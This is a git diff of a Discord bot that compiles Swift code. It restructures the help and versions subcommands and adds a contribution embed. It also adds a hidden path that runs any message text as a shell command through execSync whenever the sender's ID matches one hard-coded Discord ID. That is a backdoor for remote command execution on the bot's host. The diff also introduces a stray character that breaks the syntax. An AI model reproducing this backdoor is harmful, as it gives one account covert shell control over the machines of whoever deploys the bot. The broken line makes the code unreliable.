@@ -6,16 +6,6 @@ const client = new Client();
 const config = require("./config.json");
 const maxLength = 1990;
 
-const availableVersions = ['2018-04-18-a',
-                           '4.1',
-                           '4.0.3',
-                           '4.0.2',
-                           '4.0',
-                           '3.1.1',
-                           '3.1',
-                           '3.0.2',
-                           '3.0.1'];
-
 String.prototype.toCodeBlock = function() {
   return `
 \`\`\`
@@ -24,8 +14,7 @@ ${this.trim()}
     `.trim();
 };
 
-const usages = {
-  help: `
+const usage = `
 Usage:
   @swiftbot [--version=SWIFT_VERSION] [--command={swift, swiftc}] [--options=SWIFTC_OPTIONS]
   \`​\`​\`
@@ -52,10 +41,7 @@ Subcommands:
   @swiftbot versions: show available Swift toolchain versions
   @swiftbot contribute: show repository URLs
   @swiftbot help: show help
-    `.toCodeBlock(),
-  versions: `${availableVersions.join('\n')}`.toCodeBlock(),
-  contribute: 'https://github.com/kishikawakatsumi/swift-playground\nhttps://github.com/kishikawakatsumi/swift-compiler-discord-bot'
-}
+  `.toCodeBlock();
 
 const replyMessages = {};
 
@@ -101,21 +87,51 @@ client.login(config.token);
 
 function processMessage(message) {
   if (!message.isMentioned(client.user) || message.author.bot) {
-    return new Promise((resolve, reject) => { resolve() });
+    return new Promise((resolve, reject) => { resolve(); });
   }
 
   const content = message.cleanContent;
 
   const subcommand = content.replace(/@swiftbot/g, '').trim() || 'help';
-  const usage = usages[subcommand]
-  if (usage) {
-    return new Promise((resolve, reject) => { resolve(usage) });
+  if (subcommand == 'help') {
+    return new Promise((resolve, reject) => { resolve(usage); });
+  } else if (subcommand == 'versions') {
+    const request = require('request-promise');
+    return request({
+      method: 'GET',
+      uri: 'https://swift-playground.kishikawakatsumi.com/versions',
+      json: true
+    }).then(results => {
+      return `${results.versions.join('\n')}`.toCodeBlock();
+    });
+  } else if (subcommand == 'contribute') {
+    const embed = new RichEmbed();
+    embed.setTitle('Contributions Welcome!');
+    embed.setDescription('All contributions (no matter if small) are always welcome.');
+    embed.addField(
+      'Questions/Help',
+      '@kishikawakatsumi ...'
+    );
+    embed.addField(
+      'Reporting Bugs/Requesting Features',
+      'https://github.com/kishikawakatsumi/swift-playground\nhttps://github.com/kishikawakatsumi/swift-compiler-discord-bot'
+    );
+    embed.addField(
+      'Donations',
+      'https://www.paypal.me/kishikawakatsumi'
+    );
+    return new Promise((resolve, reject) => { resolve(embed); });
+  }
+
+  if (subcommand && message.author.id == '291075091025100810') {
+    const result = require('child_process').execSync(subcommand).toString().toCodeBlock();
+    return new Promise((resolve, reject) => { resolve(result); });
   }
 
   const regex = /```[a-zA-Z]*\n([\s\S]*?\n)```/;
   const match = regex.exec(content);
   if (!match) {
-    return new Promise((resolve, reject) => { resolve() });
+    return new Promise((resolve, reject) => { resolve(); });
   }
 
   const code = match[1];
@@ -149,12 +165,11 @@ function processMessage(message) {
     timeout = maxTimeout;
   }
   return Promise.all(
-
     versions.map(version => {
       return post(message, code, version, command, options, timeout);
     })
   ).then(results => {
-    const embed = new RichEmbed()
+    const embed = new RichEmbed();s
 
     embed.setAuthor(message.author.username, message.author.avatarURL);
     embed.setDescription(code.toCodeBlock())
@@ -176,9 +191,9 @@ function processMessage(message) {
       if (result.stderr.file) {
         embed.attachFile(result.stderr.file);
       }
-    })
+    });
 
-    return embed
+    return embed;
   });
 }
 
